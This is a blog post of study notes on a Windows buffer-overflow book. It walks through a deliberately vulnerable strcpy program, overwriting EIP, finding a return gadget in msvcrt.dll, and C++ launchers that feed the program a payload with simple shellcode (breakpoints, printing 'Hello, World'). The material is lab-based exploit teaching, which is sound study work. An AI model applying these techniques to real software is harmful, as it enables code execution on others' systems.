<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Book] Windows Security Practice - Buffer Overflow | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Book] Windows Security Practice - Buffer Overflow</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-01-02T15:30:38.000Z" id="date"> 2026-01-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-01-25T15:54:56.017Z" id="updated"> 2026-01-25</time></div></span><br><span>Word Count: <div class="control">11.3k</div></span><br><span>Read Time: <div class="control">70 min</div></span></div></div><hr><div id="post-content"><h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/bufferoverflow/libro.jpg'><img src="/images/books/bufferoverflow/libro.jpg" width="500">
</p>

<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Windows Security Practice - Buffer Overflow”.<br>The content will be continuously updated as I read through the book.</p>
<h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>Finally, I have completed this book. I had wanted to read through it for a long time, but I was unable to do so for personal reasons.</p>
<p align="center" class='item-img' data-src='/images/meme/mika_rollcake.png'><img src="/images/meme/mika_rollcake.png" width="400">
</p>

<p>After reading the book <em>Reverse Engineering Core (리버스 엔지니어링 핵심 원리)</em> <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/">Click Me!</a>, I now have a deeper understanding of buffer overflows and the PE file format.</p>
<p>This book is recommended for those who want to study Windows buffer overflow techniques. I suggest that readers have a fundamental understanding of assembly language, C/C++, and reverse engineering.</p>
<p>There are some typos in this book. In addition, some practical exploitation experiments are difficult to replicate, as it is hard to find the vulnerable applications online (some of the URLs are no longer valid). However, if you want to learn buffer overflow techniques—from Windows XP to Windows 10, and from applications without any protections to those with ASLR and DEP—this book is still suitable for you.</p>
<h1 id="Chapter-1-Set-Up"><a href="#Chapter-1-Set-Up" class="headerlink" title="Chapter 1 - Set Up"></a>Chapter 1 - Set Up</h1><h2 id="1-1-VM-and-Windos-XP-SP3"><a href="#1-1-VM-and-Windos-XP-SP3" class="headerlink" title="1.1 - VM and Windos XP SP3"></a>1.1 - VM and Windos XP SP3</h2><h2 id="1-2-Tools"><a href="#1-2-Tools" class="headerlink" title="1.2 - Tools"></a>1.2 - Tools</h2><h3 id="Dev-C"><a href="#Dev-C" class="headerlink" title="Dev-C++"></a>Dev-C++</h3><p>According to the author, Dev-C++ is not recommended for software development. However, it is recommended for learning buffer overflow, as it produces executables with simpler structures.</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/orwelldevcpp/">https://sourceforge.net/projects/orwelldevcpp/</a></p>
</blockquote>
<h3 id="Visual-C-2010-Express"><a href="#Visual-C-2010-Express" class="headerlink" title="Visual C++ 2010 Express"></a>Visual C++ 2010 Express</h3><h3 id="Visual-C-2013-Express"><a href="#Visual-C-2013-Express" class="headerlink" title="Visual C++ 2013 Express"></a>Visual C++ 2013 Express</h3><h3 id="NASM"><a href="#NASM" class="headerlink" title="NASM"></a>NASM</h3><p>NASM stands for <strong>The Netwide Assembler</strong>.</p>
<h3 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h3><h3 id="WinDbg"><a href="#WinDbg" class="headerlink" title="WinDbg"></a>WinDbg</h3><h3 id="Immunity-Debugger"><a href="#Immunity-Debugger" class="headerlink" title="Immunity Debugger"></a>Immunity Debugger</h3><h3 id="CFF-Explorer"><a href="#CFF-Explorer" class="headerlink" title="CFF Explorer"></a>CFF Explorer</h3><h3 id="HxD"><a href="#HxD" class="headerlink" title="HxD"></a>HxD</h3><h3 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h3><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h1 id="Chapter-2-Change-the-Procedure-of-a-Program"><a href="#Chapter-2-Change-the-Procedure-of-a-Program" class="headerlink" title="Chapter 2 - Change the Procedure of a Program"></a>Chapter 2 - Change the Procedure of a Program</h1><h2 id="2-2-Change-the-Procedure-of-a-Program-via-Buffer-Overflow"><a href="#2-2-Change-the-Procedure-of-a-Program-via-Buffer-Overflow" class="headerlink" title="2.2 - Change the Procedure of a Program via Buffer Overflow"></a>2.2 - Change the Procedure of a Program via Buffer Overflow</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//File name: simplec001.c<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br><br>void func(char *str) &#123;<br>	char buffer[24];<br>	int *ret;<br>	strcpy(buffer, str);<br>&#125;<br><br>int main(int argc, char** argv) &#123;<br>    int x = 0;<br>    x = 0;<br>    func(argv[1]);<br>    x = 1;<br>    printf(&quot;x is 1\n&quot;);<br>    printf(&quot;x is 0\n&quot;);<br>    <br>    system(&quot;pause&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="2-3-Debugging-with-OllyDbg"><a href="#2-3-Debugging-with-OllyDbg" class="headerlink" title="2.3 - Debugging with OllyDbg"></a>2.3 - Debugging with OllyDbg</h2><p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.1.png'><img src="/images/books/bufferoverflow/2.1.png" width="500" alt="Setting parameter">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.2.png'><img src="/images/books/bufferoverflow/2.2.png" width="700" alt="OllyDbg: EP">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.3.png'><img src="/images/books/bufferoverflow/2.3.png" width="700" alt="OllyDbg: main function">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; gdb --args SimpleC001.exe meaningless<br>(gdb) disassemble func<br>(gdb) disassemble main<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.4.png'><img src="/images/books/bufferoverflow/2.4.png" width="700" alt="gdb">
</p>

<ul>
<li>EAX: Accumulator Register</li>
<li>ECX: Counter Register</li>
<li>EDX: Data Register</li>
<li>EBX: Base Register</li>
<li>ESP: Stack Pointer</li>
<li>EBP: Base Register</li>
<li>ESI: Source Index</li>
<li>EDI: Destination Index</li>
<li>EIP: Instruction Pointer</li>
</ul>
<p>Here “E” stands for <strong>Extended</strong>.</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.5.png'><img src="/images/books/bufferoverflow/2.5.png" width="1000" alt="OllyDbg: Pointer">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.6.png'><img src="/images/books/bufferoverflow/2.6.png" width="500" alt="OllyDbg: EAX">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.7.png'><img src="/images/books/bufferoverflow/2.7.png" width="700" alt="OllyDbg: 006B1708">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.8.png'><img src="/images/books/bufferoverflow/2.8.png" width="700" alt="OllyDbg: Stack">
</p>

<hr>
<p>Modifying the address:</p>
<script type="math/tex; mode=display">
\begin{align*}
0x00401548 + 0x00000014 = 0x0040155C
\end{align*}</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">*((int*)(buffer+0x20+0x4)) += 0x14;<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.9.png'><img src="/images/books/bufferoverflow/2.9.png" width="700" alt="OllyDbg: Stack Frame">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.10.png'><img src="/images/books/bufferoverflow/2.10.png" width="900" alt="OllyDbg: C++ code, modifying the return address.">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.11.png'><img src="/images/books/bufferoverflow/2.11.png" width="700" alt="Result: x is 0. It skips 'x is 1'.">
</p>

<p>Notice that the value <code>0x14</code> and <code>0x20</code> are depend on your OS.</p>
<h2 id="2-4-Basic-Buffer-Overflow"><a href="#2-4-Basic-Buffer-Overflow" class="headerlink" title="2.4 - Basic Buffer Overflow"></a>2.4 - Basic Buffer Overflow</h2><p>Code (You may remove <code>system(&quot;pause&quot;);</code>):<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br><br>void func(char *str) &#123;<br>	char buffer[24];<br>	int *ret;<br>	strcpy(buffer, str);<br>&#125;<br><br>int main(int argc, char** argv) &#123;<br>    int x = 0;<br>    x = 0;<br>    func(argv[1]);<br>    x = 1;<br>    printf(&quot;x is 1\n&quot;);<br>    printf(&quot;x is 0\n&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><br>Don’t forget to recompile your code.</p>
<p>Now we need to cause the program to crash. Before doing so, we need to configure OllyDbg:</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.12.png'><img src="/images/books/bufferoverflow/2.12.png" width="700" alt="Options -> Just in time debugging -> Make OllyDbg just in time debugger -> Done">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.13.png'><img src="/images/books/bufferoverflow/2.13.png" width="700" alt="Input parameter.">
</p>

<p>Here, we input 48 characters of ‘A’ and then execute the program. As a result, the program is crashed:</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.14.png'><img src="/images/books/bufferoverflow/2.14.png" width="700" alt="Program crashed.">
</p>

<p>Notice the hexadecimal representation of letter A is <code>0x41</code>. From the register window of OllyDbg, EIP is overwritten by letter A.</p>
<p><strong>If the input string can overwrite the EIP register, then the program has a buffer overflow vulnerability.</strong></p>
<p>A buffer overflow does not necessarily exist in every program. Even if it exists, it is not always exploitable. Exploitability depends on the environment, register states, memory layout, and operating system protections.</p>
<hr>
<p>In this example we are going to attack the vulnerable <code>simplec001.exe</code> from previous section (<strong>Notice that we use C++ in this example)</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//File name: attack-simplec001.cpp<br>#include &lt;string&gt;<br>#include &lt;sstream&gt;<br>#include &lt;cstdlib&gt;<br><br>using namespace std;<br><br>int main(int argc, char* argv[]) &#123;<br>	string simplec001(argv[1]);<br>	string buffer_overflow(40, &#x27;A&#x27;);<br>	ostringstream sout;<br>	<br>	sout &lt;&lt; &#x27;\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\&quot; &quot; &lt;&lt; buffer_overflow;<br>	system(sout.str().c_str());<br>	<br>	system(&quot;pause&quot;);<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.15.png'><img src="/images/books/bufferoverflow/2.15.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.16.png'><img src="/images/books/bufferoverflow/2.16.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.17.png'><img src="/images/books/bufferoverflow/2.17.png" width="700">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB<br></code></pre></td></tr></table></figure>
<p>Again, the input string length depends on OS.</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.18.png'><img src="/images/books/bufferoverflow/2.18.png" width="700">
</p>
Here, we have been successfully overwritten EIP with letter B. Notice that the hexadecimal representation of letter B is `0x42`


## 2.5 - Basic Shellcode

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC<br></code></pre></td></tr></table></figure>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.19.png'><img src="/images/books/bufferoverflow/2.19.png" width="700">
</p>
Here, we modified the value of both EBP and EIP. Notice that the hexadecimal representation of letter C is `0x43`.

---
We obtain the opcodes with WinDbg:
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; a<br></code></pre></td></tr></table></figure>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.20.png'><img src="/images/books/bufferoverflow/2.20.png" width="700">
</p>

<p>Write assembly code. Press enter with empty command to exit.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">77441b52 push esp<br>77441b53 retn<br>77441b54 <br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.21.png'><img src="/images/books/bufferoverflow/2.21.png" width="700">
</p>


<p>Search <code>54</code> and <code>c3</code> in <code>msvcrt.dll</code>(<code>755f0000</code>~<code>756af000</code>)<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; s 755f0000 756af000 54 c3<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/2.22.png'><img src="/images/books/bufferoverflow/2.22.png" width="700">
</p>

<p>Hence, we can the value <code>75687448</code> to overwrite EIP. Consequently, CPU jumps to <code>75687448</code> and executes <code>54 c3</code> (<code>push esp</code> and <code>ret</code>).</p>
<p>The following code is our attacking code:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;string&gt;<br>#include &lt;sstream&gt;<br>#include &lt;cstdlib&gt;<br><br>using namespace std;<br><br>int main(int argc, char* argv[]) &#123;<br>	string simplec001(argv[1]);<br>	string junk(32, &#x27;A&#x27;);<br>	string ebp(4, &#x27;B&#x27;);<br>	string eip(&quot;\x48\x74\x68\x75&quot;); // msvcert.dll 75687448, push esp # retn<br>	string insructions(&quot;\xcc\xcc\xcc\xcc&quot;);<br>	ostringstream sout;<br>	<br>	sout &lt;&lt; &#x27;\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\&quot; &quot; &lt;&lt; buffer_overflow;<br>	system(sout.str().c_str());<br>	<br>	system(&quot;pause&quot;);<br>&#125;<br></code></pre></td></tr></table></figure></p>
<hr>
<p>To avoiding the invalid address value in EBP:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;string&gt;<br>#include &lt;sstream&gt;<br>#include &lt;cstdlib&gt;<br><br>using namespace std;<br><br>int main(int argc, char* argv[]) &#123;<br>	string simplec001(argv[1]);<br>	string junk(32, &#x27;A&#x27;);<br>	string ebp(4, &#x27;B&#x27;);<br>	string eip(&quot;\x48\x74\x68\x75&quot;); // msvcert.dll 75687448, push esp # retn<br>	string instructions;<br>	instructions +=<br>		&quot;\xc7\xc5\x77\x77\x77\x77&quot;	// MOV, EBP, 0x77777777<br>		&quot;\xc7\xc1\xdf\x89\x16\x77&quot;	// MOV ECX,0X771689DF<br>		&quot;\x33\xe9&quot;					// XOR EBP,ECX<br>		&quot;\xc7\xc0\x77\x77\x77\x77&quot;	// MOV EAX, 0x77777777<br>		&quot;\xc7\xc1\x2b\x62\x37\x77&quot;	// MOV ECX,0x7737622B<br>		&quot;\x33\xc1\x42&quot;				// XOR EAX, ECX # INC EDX<br>		&quot;\xff\xe0\x42&quot;;				// JMP EAX # INC EDX<br>	ostringstream sout;<br>	<br>	sout &lt;&lt; &#x27;\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\&quot; &quot; &lt;&lt; junk &lt;&lt; ebp &lt;&lt; eip &lt;&lt; instructions;<br>	system(sout.str().c_str());<br>	<br>	system(&quot;pause&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
<hr>
<h1 id="Chapter-3-Change-the-Action-of-a-Program"><a href="#Chapter-3-Change-the-Action-of-a-Program" class="headerlink" title="Chapter 3 - Change the Action of a Program"></a>Chapter 3 - Change the Action of a Program</h1><h2 id="3-2-From-C-Language-to-Shellcode"><a href="#3-2-From-C-Language-to-Shellcode" class="headerlink" title="3.2 - From C Language to Shellcode"></a>3.2 - From C Language to Shellcode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br><br>int main() &#123;<br>	printf(&quot;Hello, World\n&quot;);<br>	exit(0); <br>&#125;<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.1.png'><img src="/images/books/bufferoverflow/3.1.png" width="600" alt="Address of printf(): 75669E20">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.2.png'><img src="/images/books/bufferoverflow/3.2.png" width="600" alt="Address of exit(): 75656690">
</p>

<p>Convert “Hello, World!\n” into hexadecimal format:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; python<br>&gt;&gt;&gt; &quot;Hello, World!\n&quot;.encode(&#x27;utf-8&#x27;).hex()<br>&#x27;48656c6c6f2c20576f726c64210a&#x27;<br></code></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">48 65 6C 6C<br>6F 2C 20 57<br>6F 72 6C 64<br>21 0A<br></code></pre></td></tr></table></figure><br>Assembly code:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PUSH 0x210A0000<br>PUSH 0x6F2C2057<br>PUSH 0x6F726C64<br>PUSH 0x48656C6C<br>PUSH ESP<br></code></pre></td></tr></table></figure><br>Because little-endian is used in memory, the addresses must be reversed. Completed code:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PUSH 0x00000A21<br>PUSH 0x646C726F<br>PUSH 0x57202C6F<br>PUSH 0x6C6C6548<br>PUSH ESP<br>MOV ECX,0x75669E20  ; Load 75669E20 into ECX. This is the address of printf()<br>CALL ECX            ; Call printf()<br>XOR EAX,EAX         ; Load 0 into EAX<br>PUSH EAX            ; Load 0 into [ESP] for exit()<br>MOV ECX,0x75656690  ; Load 75656690 into ECX. This is the address of exit()<br>CALL ECX            ; Call exit()<br></code></pre></td></tr></table></figure></p>
<h2 id="3-3-Using-Plugin-to-Obtain-Shellcode"><a href="#3-3-Using-Plugin-to-Obtain-Shellcode" class="headerlink" title="3.3 - Using Plugin to Obtain Shellcode"></a>3.3 - Using Plugin to Obtain Shellcode</h2><p>We use <strong>mona</strong> and <strong>Immunity Debugger</strong> to obtain the hexadecimal shellcode.</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona assemble -s PUSH 0x00000A21 # PUSH 0x646C726F # PUSH 0x57202C6F # PUSH 0x6C6C6548 # PUSH ESP # MOV ECX,0x75669E20 # CALL ECX # XOR EAX,EAX # PUSH EAX # # MOV ECX,0x75656690 # CALL ECX<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.3.png'><img src="/images/books/bufferoverflow/3.3.png" width="800">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.4.png'><img src="/images/books/bufferoverflow/3.4.png" width="800">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Full opcode:<br>\x68\x21\x0a\x00\x00\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20\x57\x68\x48\x65\x6c\x6c\x54\xc7\xc1\x20\x9e\x66\x75\xff\xd1\x33\xc0\x50\xc7\xc1\x90\x66\x65\x75\xff\xd1<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//TestShellcode.cpp<br>#include &lt;cstdio&gt;<br>using namespace std;<br><br>char shellcode[] =<br>&quot;\x68\x21\x0a\x00\x00&quot;		//PUSH 0x00000A21<br>&quot;\x68\x6f\x72\x6c\x64&quot;		//PUSH 0x646C726F<br>&quot;\x68\x6f\x2c\x20\x57&quot;		//PUSH 0x57202C6F<br>&quot;\x68\x48\x65\x6c\x6c&quot;		//PUSH 0x6C6C6548<br>&quot;\x54&quot;						//PUSH ESP<br>&quot;\xc7\xc1\x20\x9e\x66\x75&quot;	//MOV ECX,0x75669E20<br>&quot;\xff\xd1&quot;					//CALL ECX   <br>&quot;\x33\xc0&quot;					//XOR EAX,EAX<br>&quot;\x50&quot;						//PUSH EAX <br>&quot;\xc7\xc1\x90\x66\x65\x75&quot;	//MOV ECX,0x75656690<br>&quot;\xff\xd1&quot;;					//CALL ECX <br><br>typedef void (*FUNCPTR) ();<br><br>int main() &#123;<br>	printf(&quot;Starting to execute shellcode:\n&quot;);<br>	FUNCPTR fp = (FUNCPTR)shellcode;<br>	fp();<br>	<br>	printf(&quot;This line will not be displayed since we call exit()&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.5.png'><img src="/images/books/bufferoverflow/3.5.png" width="1000">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.6.png'><img src="/images/books/bufferoverflow/3.6.png" width="700">
</p>

<h2 id="3-4-Using-nasm-shell-rb-from-Metasploit-to-Obtain-Shellcode"><a href="#3-4-Using-nasm-shell-rb-from-Metasploit-to-Obtain-Shellcode" class="headerlink" title="3.4 - Using nasm_shell.rb from Metasploit to Obtain Shellcode"></a>3.4 - Using nasm_shell.rb from Metasploit to Obtain Shellcode</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/fishstiqz/nasmshell">https://github.com/fishstiqz/nasmshell</a></p>
</blockquote>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/3.7.png'><img src="/images/books/bufferoverflow/3.7.png" width="700">
</p>

